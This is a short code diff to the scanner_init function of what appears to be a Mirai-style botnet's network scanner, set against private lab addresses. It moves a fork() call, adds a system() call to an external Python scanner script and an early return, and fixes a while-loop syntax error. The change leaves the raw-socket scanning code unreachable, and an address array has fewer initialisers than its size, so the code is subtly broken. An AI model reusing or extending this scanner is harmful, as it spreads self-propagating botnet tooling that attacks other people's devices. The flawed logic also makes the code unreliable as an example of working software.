@@ -56,14 +56,16 @@ int recv_strip_null(int sock, void *buf, int len, int flags)
 
 void scanner_init(void)
 {
+    // Let parent continue on main thread
+    scanner_pid = fork();
+    system("python3 scanner.py");
+    return;
     int i;
     printf("INITIALIZING SCANNER\n");
     uint16_t source_port;
     struct iphdr *iph;
     struct tcphdr *tcph;
 
-    // Let parent continue on main thread
-    scanner_pid = fork();
     if (scanner_pid > 0 || scanner_pid == -1)
         return;
 
@@ -193,7 +195,7 @@ void scanner_init(void)
     ipv4_t addresses[4] = {INET_ADDR(192, 168, 10, 8), INET_ADDR(192, 168, 10, 6), INET_ADDR(192, 168, 10, 7)};
     int j = 0;
     // Main logic loop
-    while TRUE
+    while (TRUE)
     {
         j ++;
         j = j % 3;
